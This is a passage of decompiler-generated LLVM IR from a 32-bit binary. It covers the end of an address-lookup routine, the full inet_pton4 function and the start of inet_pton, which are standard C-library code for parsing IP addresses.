  store i32 %v4_805dcb4, i32* %eax.global-to-local, align 4
  %v2_805dcb8 = load i8, i8* %v3_805dcb4, align 1
  %v3_805dcb8 = icmp eq i8 %v2_805dcb8, 0
  %v0_805dcde = load i32, i32* @edi, align 4
  br i1 %v3_805dcb8, label %dec_label_pc_805dcde, label %dec_label_pc_805dcbd

dec_label_pc_805dcbd:                             ; preds = %dec_label_pc_805dc9b
  %v1_805dcbd = inttoptr i32 %v0_805dcde to i32*
  %v2_805dcbd = load i32, i32* %v1_805dcbd, align 4
  %v1_805dcbf = and i32 %v2_805dcbd, 1024
  %v2_805dcbf = icmp eq i32 %v1_805dcbf, 0
  store i32 %v1_805dcbf, i32* %eax.global-to-local, align 4
  %v1_805dcc6 = icmp eq i1 %v2_805dcbf, false
  br i1 %v1_805dcc6, label %dec_label_pc_805de7f, label %dec_label_pc_805dccc

dec_label_pc_805dccc:                             ; preds = %dec_label_pc_805dcbd
  %v2_805dccc = ptrtoint i8** %stack_var_-32 to i32
  store i32 %v2_805dccc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dd05

dec_label_pc_805dcde:                             ; preds = %dec_label_pc_805dc9b
  %v1_805dcde = add i32 %v0_805dcde, 8
  %v2_805dcde = inttoptr i32 %v1_805dcde to i32*
  %v3_805dcde = load i32, i32* %v2_805dcde, align 4
  %v4_805dcde = icmp eq i32 %v3_805dcde, 0
  %v1_805dce2 = icmp eq i1 %v4_805dcde, false
  br i1 %v1_805dce2, label %dec_label_pc_805dcf3, label %dec_label_pc_805dce4

dec_label_pc_805dce4:                             ; preds = %dec_label_pc_805dcde
  store i32 -8, i32* %eax.global-to-local, align 4
  %v1_805dce9 = add i32 %v0_805dcde, 12
  %v2_805dce9 = inttoptr i32 %v1_805dce9 to i32*
  %v3_805dce9 = load i32, i32* %v2_805dce9, align 4
  %v4_805dce9 = icmp eq i32 %v3_805dce9, 0
  br i1 %v4_805dce9, label %dec_label_pc_805de89, label %dec_label_pc_805dcf3

dec_label_pc_805dcf3:                             ; preds = %dec_label_pc_805dce4, %dec_label_pc_805dcde
  br label %dec_label_pc_805dd05

dec_label_pc_805dd05:                             ; preds = %dec_label_pc_805dc92, %dec_label_pc_805dc96, %dec_label_pc_805dcf3, %dec_label_pc_805dccc
  %v0_805dd3e.pre86 = phi i32 [ %v0_805dcde, %dec_label_pc_805dcf3 ], [ %v0_805dcde, %dec_label_pc_805dccc ], [ %v0_805dc76, %dec_label_pc_805dc96 ], [ %v0_805dc76, %dec_label_pc_805dc92 ]
  %v4_805dd0d = icmp eq i32 %arg4, 0
  br i1 %v4_805dd0d, label %dec_label_pc_805dd1c, label %dec_label_pc_805dd14

dec_label_pc_805dd14:                             ; preds = %dec_label_pc_805dd05
  %v2_805dd14 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805dd14, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dd1c

dec_label_pc_805dd1c:                             ; preds = %dec_label_pc_805dd05, %dec_label_pc_805dd14
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_805dd05 ], [ %v2_805dd14, %dec_label_pc_805dd14 ]
  store i32 ptrtoint (i32* @global_var_806d71c.718 to i32), i32* @ebp, align 4
  %v3_805de332150 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_806d71c.718 to i32), i32 4) to i32*), align 4
  %v4_805de332251 = icmp eq i32 %v3_805de332150, 0
  %v1_805de372958 = icmp eq i1 %v4_805de332251, false
  br i1 %v1_805de372958, label %dec_label_pc_805dd3e.lr.ph.lr.ph, label %dec_label_pc_805de3d.thread

dec_label_pc_805de3d.thread:                      ; preds = %dec_label_pc_805dd1c
  store i32 -6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de89

dec_label_pc_805dd3e.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805dd1c
  br label %dec_label_pc_805dd3e.lr.ph

dec_label_pc_805dd3e:                             ; preds = %dec_label_pc_805dd3e.lr.ph, %dec_label_pc_805ddf0
  %v0_805dd41 = phi i32 [ %v0_805dd4177, %dec_label_pc_805dd3e.lr.ph ], [ %v0_805ddf4, %dec_label_pc_805ddf0 ]
  %stack_var_-80.232 = phi i32 [ %stack_var_-80.2.ph62, %dec_label_pc_805dd3e.lr.ph ], [ %v0_805ddf4, %dec_label_pc_805ddf0 ]
  %v0_805dd50 = phi i32 [ %v0_805dd3e.pre, %dec_label_pc_805dd3e.lr.ph ], [ %v0_805dde5, %dec_label_pc_805ddf0 ]
  %stack_var_-88.130 = phi i32 [ %stack_var_-88.1.ph61, %dec_label_pc_805dd3e.lr.ph ], [ %v0_805dddf, %dec_label_pc_805ddf0 ]
  %v1_805dd3e = add i32 %v0_805dd50, 4
  %v2_805dd3e = inttoptr i32 %v1_805dd3e to i32*
  %v3_805dd3e = load i32, i32* %v2_805dd3e, align 4
  %v1_805dd41 = inttoptr i32 %v0_805dd41 to i32*
  %v2_805dd41 = load i32, i32* %v1_805dd41, align 4
  store i32 %v2_805dd41, i32* %eax.global-to-local, align 4
  %v12_805dd44 = icmp eq i32 %v3_805dd3e, %v2_805dd41
  br i1 %v12_805dd44, label %dec_label_pc_805dd50, label %dec_label_pc_805dd48

dec_label_pc_805dd48:                             ; preds = %dec_label_pc_805dd3e
  %v1_805dd48 = icmp eq i32 %v3_805dd3e, 0
  %v1_805dd4a = icmp eq i1 %v1_805dd48, false
  br i1 %v1_805dd4a, label %dec_label_pc_805de30, label %dec_label_pc_805dd50

dec_label_pc_805dd50:                             ; preds = %dec_label_pc_805dd48, %dec_label_pc_805dd3e
  %v1_805dd50 = inttoptr i32 %v0_805dd50 to i8*
  %v2_805dd50 = load i8, i8* %v1_805dd50, align 1
  %v3_805dd50 = and i8 %v2_805dd50, 32
  %v4_805dd50 = icmp eq i8 %v3_805dd50, 0
  br i1 %v4_805dd50, label %dec_label_pc_805ddb5, label %dec_label_pc_805dd55

dec_label_pc_805dd55:                             ; preds = %dec_label_pc_805dd50
  store i32 %v2_805dd41, i32* @esi, align 4
  %v1_805dd57 = call i32 @__errno_location(i32 0)
  store i32 %v1_805dd57, i32* %eax.global-to-local, align 4
  %v0_805dd5c = load i32, i32* @esi, align 4
  %v1_805dd5c = trunc i32 %v0_805dd5c to i16
  %v10_805dd5c = icmp eq i16 %v1_805dd5c, 2
  store i32 %v1_805dd57, i32* @ebx, align 4
  %v1_805dd62 = inttoptr i32 %v1_805dd57 to i32*
  %v2_805dd62 = load i32, i32* %v1_805dd62, align 4
  br i1 %v10_805dd5c, label %dec_label_pc_805dda6, label %dec_label_pc_805dd6a

dec_label_pc_805dd6a:                             ; preds = %dec_label_pc_805dd55
  %v10_805dd6a = icmp eq i16 %v1_805dd5c, 10
  store i32 2, i32* %eax.global-to-local, align 4
  br i1 %v10_805dd6a, label %dec_label_pc_805ddab, label %dec_label_pc_805dd75

dec_label_pc_805dd75:                             ; preds = %dec_label_pc_805dd6a
  %v1_805dd75 = urem i32 %v0_805dd5c, 65536
  store i32 %v1_805dd75, i32* %eax.global-to-local, align 4
  %v5_805dd7e = call i32 @socket(i32 %v1_805dd75, i32 2, i32 0)
  store i32 %v5_805dd7e, i32* %eax.global-to-local, align 4
  %v2_805dd86 = icmp slt i32 %v5_805dd7e, 0
  %v1_805dd88 = icmp eq i1 %v2_805dd86, false
  br i1 %v1_805dd88, label %dec_label_pc_805dd93, label %dec_label_pc_805dd8a

dec_label_pc_805dd8a:                             ; preds = %dec_label_pc_805dd75
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805dd8c = load i32, i32* @ebx, align 4
  %v1_805dd8c = inttoptr i32 %v0_805dd8c to i32*
  %v2_805dd8c = load i32, i32* %v1_805dd8c, align 4
  %v11_805dd8c = icmp eq i32 %v2_805dd8c, 24
  %v1_805dd8f = icmp eq i1 %v11_805dd8c, false
  br i1 %v1_805dd8f, label %dec_label_pc_805ddab, label %dec_label_pc_805dda6

dec_label_pc_805dd93:                             ; preds = %dec_label_pc_805dd75
  %v2_805dd97 = call i32 @__libc_close(i32 %v5_805dd7e)
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805ddb1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805ddab

dec_label_pc_805dda6:                             ; preds = %dec_label_pc_805dd8a, %dec_label_pc_805dd55
  %v1_805ddb179 = phi i32 [ %v0_805dd8c, %dec_label_pc_805dd8a ], [ %v1_805dd57, %dec_label_pc_805dd55 ]
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ddab

dec_label_pc_805ddab:                             ; preds = %dec_label_pc_805dd8a, %dec_label_pc_805dd6a, %dec_label_pc_805dd93, %dec_label_pc_805dda6
  %v1_805ddb1 = phi i32 [ %v0_805dd8c, %dec_label_pc_805dd8a ], [ %v1_805dd57, %dec_label_pc_805dd6a ], [ %v1_805ddb1.pre, %dec_label_pc_805dd93 ], [ %v1_805ddb179, %dec_label_pc_805dda6 ]
  %v0_805ddaf = phi i1 [ true, %dec_label_pc_805dd8a ], [ false, %dec_label_pc_805dd6a ], [ false, %dec_label_pc_805dd93 ], [ false, %dec_label_pc_805dda6 ]
  %v2_805ddb1 = inttoptr i32 %v1_805ddb1 to i32*
  store i32 %v2_805dd62, i32* %v2_805ddb1, align 4
  %v0_805de30.pre.pre = load i32, i32* @ebp, align 4
  br i1 %v0_805ddaf, label %dec_label_pc_805de30, label %dec_label_pc_805ddb5

dec_label_pc_805ddb5:                             ; preds = %dec_label_pc_805ddab, %dec_label_pc_805dd50
  %v4_805ddd9 = phi i32 [ %v0_805dd41, %dec_label_pc_805dd50 ], [ %v0_805de30.pre.pre, %dec_label_pc_805ddab ]
  %v5_805ddd9 = add i32 %v4_805ddd9, 4
  %v6_805ddd9 = inttoptr i32 %v5_805ddd9 to i32*
  %v7_805ddd9 = load i32, i32* %v6_805ddd9, align 4
  call void @__pseudo_call(i32 %v7_805ddd9)
  %v0_805dddf = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805dddf, i32* @esi, align 4
  %v1_805dde1 = icmp eq i32 %v0_805dddf, 0
  br i1 %v1_805dde1, label %dec_label_pc_805de2c, label %dec_label_pc_805dde5

dec_label_pc_805dde5:                             ; preds = %dec_label_pc_805ddb5
  %v0_805dde5 = load i32, i32* @edi, align 4
  %v1_805dde5 = add i32 %v0_805dde5, 4
  %v2_805dde5 = inttoptr i32 %v1_805dde5 to i32*
  %v3_805dde5 = load i32, i32* %v2_805dde5, align 4
  %v4_805dde5 = icmp eq i32 %v3_805dde5, 0
  %v1_805dde9 = icmp eq i1 %v4_805dde5, false
  br i1 %v1_805dde9, label %dec_label_pc_805ddfa, label %dec_label_pc_805ddeb

dec_label_pc_805ddeb:                             ; preds = %dec_label_pc_805dde5
  %v3_805ddeb = and i32 %v0_805dddf, 256
  %v4_805ddeb = icmp eq i32 %v3_805ddeb, 0
  br i1 %v4_805ddeb, label %dec_label_pc_805ddfa, label %dec_label_pc_805ddf0

dec_label_pc_805ddf0:                             ; preds = %dec_label_pc_805ddeb
  %v0_805ddf4 = load i32, i32* @ebp, align 4
  %v1_805de33 = add i32 %v0_805ddf4, 4
  %v2_805de33 = inttoptr i32 %v1_805de33 to i32*
  %v3_805de33 = load i32, i32* %v2_805de33, align 4
  %v4_805de33 = icmp eq i32 %v3_805de33, 0
  %v1_805de37 = icmp eq i1 %v4_805de33, false
  br i1 %v1_805de37, label %dec_label_pc_805dd3e, label %dec_label_pc_805de3d.thread117

dec_label_pc_805de3d.thread117:                   ; preds = %dec_label_pc_805ddf0
  store i32 -6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de49

dec_label_pc_805ddfa:                             ; preds = %dec_label_pc_805ddeb, %dec_label_pc_805dde5
  %v3_805ddfa = load i8*, i8** %stack_var_-24, align 4
  %v4_805ddfa = ptrtoint i8* %v3_805ddfa to i32
  store i32 %v4_805ddfa, i32* %eax.global-to-local, align 4
  %v1_805ddfe = icmp eq i8* %v3_805ddfa, null
  br i1 %v1_805ddfe, label %dec_label_pc_805de78, label %dec_label_pc_805de02

dec_label_pc_805de02:                             ; preds = %dec_label_pc_805ddfa
  %v1_805de06 = call i32 @freeaddrinfo(i32 %v4_805ddfa)
  store i32 %v1_805de06, i32* %eax.global-to-local, align 4
  %v0_805de0e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805de78

dec_label_pc_805de2c:                             ; preds = %dec_label_pc_805ddb5
  %v4_805ddb5 = add i32 %stack_var_-88.130, 1
  %v0_805de2c = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805de30

dec_label_pc_805de30:                             ; preds = %dec_label_pc_805ddab, %dec_label_pc_805dd48, %dec_label_pc_805de2c
  %stack_var_-80.1 = phi i32 [ %v0_805de2c, %dec_label_pc_805de2c ], [ %stack_var_-80.232, %dec_label_pc_805ddab ], [ %stack_var_-80.232, %dec_label_pc_805dd48 ]
  %v0_805de30 = phi i32 [ %v0_805de2c, %dec_label_pc_805de2c ], [ %v0_805de30.pre.pre, %dec_label_pc_805ddab ], [ %v0_805dd41, %dec_label_pc_805dd48 ]
  %stack_var_-88.0 = phi i32 [ %v4_805ddb5, %dec_label_pc_805de2c ], [ %stack_var_-88.130, %dec_label_pc_805ddab ], [ %stack_var_-88.130, %dec_label_pc_805dd48 ]
  %v1_805de30 = add i32 %v0_805de30, 8
  store i32 %v1_805de30, i32* @ebp, align 4
  %v1_805de3319 = add i32 %v0_805de30, 12
  %v2_805de3320 = inttoptr i32 %v1_805de3319 to i32*
  %v3_805de3321 = load i32, i32* %v2_805de3320, align 4
  %v4_805de3322 = icmp eq i32 %v3_805de3321, 0
  %v1_805de3729 = icmp eq i1 %v4_805de3322, false
  br i1 %v1_805de3729, label %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge, label %dec_label_pc_805de3d

dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge: ; preds = %dec_label_pc_805de30
  %v0_805dd3e.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805dd3e.lr.ph

dec_label_pc_805dd3e.lr.ph:                       ; preds = %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge, %dec_label_pc_805dd3e.lr.ph.lr.ph
  %v0_805dd3e.pre = phi i32 [ %v0_805dd3e.pre86, %dec_label_pc_805dd3e.lr.ph.lr.ph ], [ %v0_805dd3e.pre.pre, %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge ]
  %v0_805dd4177 = phi i32 [ ptrtoint (i32* @global_var_806d71c.718 to i32), %dec_label_pc_805dd3e.lr.ph.lr.ph ], [ %v1_805de30, %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge ]
  %stack_var_-80.2.ph62 = phi i32 [ %stack_var_-80.0, %dec_label_pc_805dd3e.lr.ph.lr.ph ], [ %stack_var_-80.1, %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge ]
  %stack_var_-88.1.ph61 = phi i32 [ 0, %dec_label_pc_805dd3e.lr.ph.lr.ph ], [ %stack_var_-88.0, %dec_label_pc_805de30.dec_label_pc_805dd3e.lr.ph_crit_edge ]
  br label %dec_label_pc_805dd3e

dec_label_pc_805de3d:                             ; preds = %dec_label_pc_805de30
  store i32 -6, i32* %eax.global-to-local, align 4
  %v4_805de42 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_805de42, label %dec_label_pc_805de89, label %dec_label_pc_805de49

dec_label_pc_805de49:                             ; preds = %dec_label_pc_805de3d.thread117, %dec_label_pc_805de3d
  %stack_var_-88.1.lcssa119 = phi i32 [ %v0_805dddf, %dec_label_pc_805de3d.thread117 ], [ %stack_var_-88.0, %dec_label_pc_805de3d ]
  %v3_805de49 = load i8*, i8** %stack_var_-24, align 4
  %v4_805de49 = ptrtoint i8* %v3_805de49 to i32
  store i32 %v4_805de49, i32* %eax.global-to-local, align 4
  %v1_805de4d = icmp eq i8* %v3_805de49, null
  br i1 %v1_805de4d, label %dec_label_pc_805de5b, label %dec_label_pc_805de51

dec_label_pc_805de51:                             ; preds = %dec_label_pc_805de49
  %v2_805de55 = inttoptr i32 %arg4 to i32*
  store i32 %v4_805de49, i32* %v2_805de55, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de89

dec_label_pc_805de5b:                             ; preds = %dec_label_pc_805de49
  %v1_805de60 = icmp eq i1 %v4_805dd0d, false
  br i1 %v1_805de60, label %dec_label_pc_805de6d, label %dec_label_pc_805de62

dec_label_pc_805de62:                             ; preds = %dec_label_pc_805de5b
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de78

dec_label_pc_805de6d:                             ; preds = %dec_label_pc_805de5b
  br label %dec_label_pc_805de78

dec_label_pc_805de78:                             ; preds = %dec_label_pc_805de02, %dec_label_pc_805ddfa, %dec_label_pc_805de6d, %dec_label_pc_805de62
  %storemerge = phi i32 [ %stack_var_-88.1.lcssa119, %dec_label_pc_805de62 ], [ %stack_var_-88.1.lcssa119, %dec_label_pc_805de6d ], [ %v0_805dddf, %dec_label_pc_805ddfa ], [ %v0_805de0e.pre, %dec_label_pc_805de02 ]
  %v13_805de78 = and i32 %storemerge, -257
  %v1_805de7b = sub i32 0, %v13_805de78
  store i32 %v1_805de7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de89

dec_label_pc_805de7f:                             ; preds = %dec_label_pc_805dcbd, %dec_label_pc_805dc52
  store i32 -2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de89

dec_label_pc_805de86:                             ; preds = %dec_label_pc_805dc87, %dec_label_pc_805dc76
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805de89

dec_label_pc_805de89:                             ; preds = %dec_label_pc_805de3d.thread, %dec_label_pc_805de3d, %dec_label_pc_805dce4, %dec_label_pc_805de7f, %dec_label_pc_805de78, %dec_label_pc_805de51, %dec_label_pc_805de86
  %v0_805de90 = phi i32 [ -6, %dec_label_pc_805de3d ], [ -8, %dec_label_pc_805dce4 ], [ -2, %dec_label_pc_805de7f ], [ %v1_805de7b, %dec_label_pc_805de78 ], [ 0, %dec_label_pc_805de51 ], [ -1, %dec_label_pc_805de86 ], [ -6, %dec_label_pc_805de3d.thread ]
  %v2_805de8c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_805de8c, i32* @ebx, align 4
  store i32 %v0_805dc08, i32* @esi, align 4
  store i32 %v0_805dc07, i32* @edi, align 4
  store i32 %v0_805dc06, i32* @ebp, align 4
  ret i32 %v0_805de90

; uselistorder directives
  uselistorder i32 %stack_var_-88.0, { 1, 0, 2 }
  uselistorder i32 %v0_805de30, { 1, 0 }
  uselistorder i32 %v0_805ddf4, { 1, 0, 2 }
  uselistorder i32 %v0_805dde5, { 1, 0 }
  uselistorder i32 %v0_805dddf, { 0, 1, 3, 4, 5, 2 }
  uselistorder i32 %v0_805dd8c, { 1, 0, 2 }
  uselistorder i32 %v1_805dd75, { 1, 0 }
  uselistorder i32 %v1_805dd57, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805dd41, { 1, 0, 2 }
  uselistorder i32 %v3_805dd3e, { 1, 0 }
  uselistorder i1 %v4_805dd0d, { 1, 0 }
  uselistorder i32 %v0_805dcde, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_805dc50, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i8** %stack_var_-24, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 31, 16, 9, 10, 11, 12, 13, 14, 15, 17, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805de89, { 6, 3, 4, 5, 1, 0, 2 }
  uselistorder label %dec_label_pc_805de78, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_805de49, { 1, 0 }
  uselistorder label %dec_label_pc_805de30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ddab, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805dd1c, { 1, 0 }
  uselistorder label %dec_label_pc_805dd05, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_805dc76, { 1, 0 }
  uselistorder label %dec_label_pc_805dc52, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dc3c, { 2, 0, 1 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805de96 = load i32, i32* @esi, align 4
  %v0_805de9d = load i32, i32* @eax, align 4
  store i32 %v0_805de9d, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805dea3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805dea3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805deeb15 = inttoptr i32 %v0_805de9d to i8*
  %v2_805deeb16 = load i8, i8* %v1_805deeb15, align 1
  %v3_805deeb17 = sext i8 %v2_805deeb16 to i32
  store i32 %v3_805deeb17, i32* @ecx, align 4
  %v1_805deee18 = add i32 %v0_805de9d, 1
  store i32 %v1_805deee18, i32* %ebx.global-to-local, align 4
  %v1_805deef19 = icmp eq i8 %v2_805deeb16, 0
  %v1_805def120 = icmp eq i1 %v1_805deef19, false
  br i1 %v1_805def120, label %dec_label_pc_805deae, label %dec_label_pc_805def3

dec_label_pc_805deae:                             ; preds = %entry, %dec_label_pc_805deeb.backedge
  %v3_805deeb22 = phi i32 [ %v3_805deeb, %dec_label_pc_805deeb.backedge ], [ %v3_805deeb17, %entry ]
  %v2_805deeb21 = phi i8 [ %v2_805deeb, %dec_label_pc_805deeb.backedge ], [ %v2_805deeb16, %entry ]
  %v1_805deae = add nsw i32 %v3_805deeb22, -48
  store i32 %v1_805deae, i32* @eax, align 4
  %v6_805deb4 = icmp ugt i32 %v1_805deae, 9
  br i1 %v6_805deb4, label %dec_label_pc_805ded7, label %dec_label_pc_805deb6

dec_label_pc_805deb6:                             ; preds = %dec_label_pc_805deae
  %v0_805deb6 = load i32, i32* @esi, align 4
  %v1_805deb6 = inttoptr i32 %v0_805deb6 to i8*
  %v2_805deb6 = load i8, i8* %v1_805deb6, align 1
  %v2_805deb9 = zext i8 %v2_805deb6 to i32
  %v3_805deb9 = mul nuw nsw i32 %v2_805deb9, 10
  %v3_805debc = add nsw i32 %v3_805deb9, %v1_805deae
  store i32 %v3_805debc, i32* @eax, align 4
  %v6_805dec5 = icmp ugt i32 %v3_805debc, 255
  br i1 %v6_805dec5, label %dec_label_pc_805df10, label %dec_label_pc_805dec7

dec_label_pc_805dec7:                             ; preds = %dec_label_pc_805deb6
  %v1_805dec7 = trunc i32 %v3_805debc to i8
  store i8 %v1_805dec7, i8* %v1_805deb6, align 1
  %v0_805dec9 = load i32, i32* @edx, align 4
  %v1_805dec9 = icmp eq i32 %v0_805dec9, 0
  %v1_805decb = icmp eq i1 %v1_805dec9, false
  br i1 %v1_805decb, label %dec_label_pc_805deeb.backedge, label %dec_label_pc_805decd

dec_label_pc_805decd:                             ; preds = %dec_label_pc_805dec7
  %v0_805decd = load i32, i32* @edi, align 4
  %v1_805decd = add i32 %v0_805decd, 1
  store i32 %v1_805decd, i32* @edi, align 4
  %v1_805dece = add i32 %v0_805decd, -3
  %v6_805dece = sub i32 2, %v0_805decd
  %v7_805dece = and i32 %v6_805dece, %v1_805decd
  %v8_805dece = icmp slt i32 %v7_805dece, 0
  %v9_805dece = icmp eq i32 %v1_805dece, 0
  %v10_805dece = icmp slt i32 %v1_805dece, 0
  %v3_805ded1 = icmp eq i1 %v10_805dece, %v8_805dece
  %v4_805ded1 = icmp eq i1 %v9_805dece, false
  %v5_805ded1 = and i1 %v4_805ded1, %v3_805ded1
  br i1 %v5_805ded1, label %dec_label_pc_805df10, label %dec_label_pc_805ded3

dec_label_pc_805ded3:                             ; preds = %dec_label_pc_805decd
  %v1_805ded3 = and i32 %v0_805dec9, -256
  %v2_805ded3 = or i32 %v1_805ded3, 1
  store i32 %v2_805ded3, i32* @edx, align 4
  br label %dec_label_pc_805deeb.backedge

dec_label_pc_805ded7:                             ; preds = %dec_label_pc_805deae
  %v9_805ded7 = icmp eq i8 %v2_805deeb21, 46
  %v1_805deda = icmp eq i1 %v9_805ded7, false
  br i1 %v1_805deda, label %dec_label_pc_805df10, label %dec_label_pc_805dedc

dec_label_pc_805dedc:                             ; preds = %dec_label_pc_805ded7
  %v0_805dedc = load i32, i32* @edx, align 4
  %v1_805dedc = icmp eq i32 %v0_805dedc, 0
  br i1 %v1_805dedc, label %dec_label_pc_805df10, label %dec_label_pc_805dee0

dec_label_pc_805dee0:                             ; preds = %dec_label_pc_805dedc
  %v0_805dee0 = load i32, i32* @edi, align 4
  %v9_805dee0 = icmp eq i32 %v0_805dee0, 4
  br i1 %v9_805dee0, label %dec_label_pc_805df10, label %dec_label_pc_805dee5

dec_label_pc_805dee5:                             ; preds = %dec_label_pc_805dee0
  %v0_805dee5 = load i32, i32* @esi, align 4
  %v1_805dee5 = add i32 %v0_805dee5, 1
  store i32 %v1_805dee5, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_805dee8 = inttoptr i32 %v1_805dee5 to i8*
  store i8 0, i8* %v1_805dee8, align 1
  br label %dec_label_pc_805deeb.backedge

dec_label_pc_805deeb.backedge:                    ; preds = %dec_label_pc_805dee5, %dec_label_pc_805ded3, %dec_label_pc_805dec7
  %v0_805deeb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805deeb = inttoptr i32 %v0_805deeb.pre to i8*
  %v2_805deeb = load i8, i8* %v1_805deeb, align 1
  %v3_805deeb = sext i8 %v2_805deeb to i32
  store i32 %v3_805deeb, i32* @ecx, align 4
  %v1_805deee = add i32 %v0_805deeb.pre, 1
  store i32 %v1_805deee, i32* %ebx.global-to-local, align 4
  %v1_805deef = icmp eq i8 %v2_805deeb, 0
  %v1_805def1 = icmp eq i1 %v1_805deef, false
  br i1 %v1_805def1, label %dec_label_pc_805deae, label %dec_label_pc_805deeb.dec_label_pc_805def3_crit_edge

dec_label_pc_805deeb.dec_label_pc_805def3_crit_edge: ; preds = %dec_label_pc_805deeb.backedge
  %v0_805def3.pre = load i32, i32* @edi, align 4
  %phitmp = icmp sgt i32 %v0_805def3.pre, 3
  br label %dec_label_pc_805def3

dec_label_pc_805def3:                             ; preds = %dec_label_pc_805deeb.dec_label_pc_805def3_crit_edge, %entry
  %v0_805def3 = phi i1 [ %phitmp, %dec_label_pc_805deeb.dec_label_pc_805def3_crit_edge ], [ false, %entry ]
  br i1 %v0_805def3, label %dec_label_pc_805def8, label %dec_label_pc_805df10

dec_label_pc_805def8:                             ; preds = %dec_label_pc_805def3
  %v0_805def8 = load i32, i32* @eax, align 4
  %v3_805df01 = bitcast i32* %stack_var_-20 to i16*
  %v4_805df01 = call i32 @memcpy(i16* %v3_805df01, i32 4, i32 %v0_805def8)
  br label %dec_label_pc_805df12

dec_label_pc_805df10:                             ; preds = %dec_label_pc_805dee0, %dec_label_pc_805dedc, %dec_label_pc_805ded7, %dec_label_pc_805decd, %dec_label_pc_805deb6, %dec_label_pc_805def3
  br label %dec_label_pc_805df12

dec_label_pc_805df12:                             ; preds = %dec_label_pc_805def8, %dec_label_pc_805df10
  %v0_805df19 = phi i32 [ 1, %dec_label_pc_805def8 ], [ 0, %dec_label_pc_805df10 ]
  store i32 %v0_805de96, i32* @esi, align 4
  ret i32 %v0_805df19

; uselistorder directives
  uselistorder i32 %v3_805deeb, { 1, 0 }
  uselistorder i8 %v2_805deeb, { 1, 2, 0 }
  uselistorder i32 %v1_805dece, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805df12, { 1, 0 }
  uselistorder label %dec_label_pc_805df10, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805deae, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805df1a = load i32, i32* @ebp, align 4
  %v0_805df1b = load i32, i32* @edi, align 4
  %v0_805df1c = load i32, i32* @esi, align 4
  %v0_805df1d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805df25 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805df25, i32* @edi, align 4
  %v9_805df29 = icmp eq i32 %arg1, 2
  br i1 %v9_805df29, label %dec_label_pc_805df39, label %dec_label_pc_805df2e

dec_label_pc_805df2e:                             ; preds = %entry
  %v9_805df2e = icmp eq i32 %arg1, 10
  %v1_805df31 = icmp eq i1 %v9_805df2e, false
  br i1 %v1_805df31, label %dec_label_pc_805e0ca, label %dec_label_pc_805df49

dec_label_pc_805df39:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_805df25, i32* @eax, align 4
  %v3_805df3f = call i32 @inet_pton4(i32 %v0_805df1d, i32 %v0_805df1c, i32 %v0_805df1b)
  store i32 %v3_805df3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e0dc

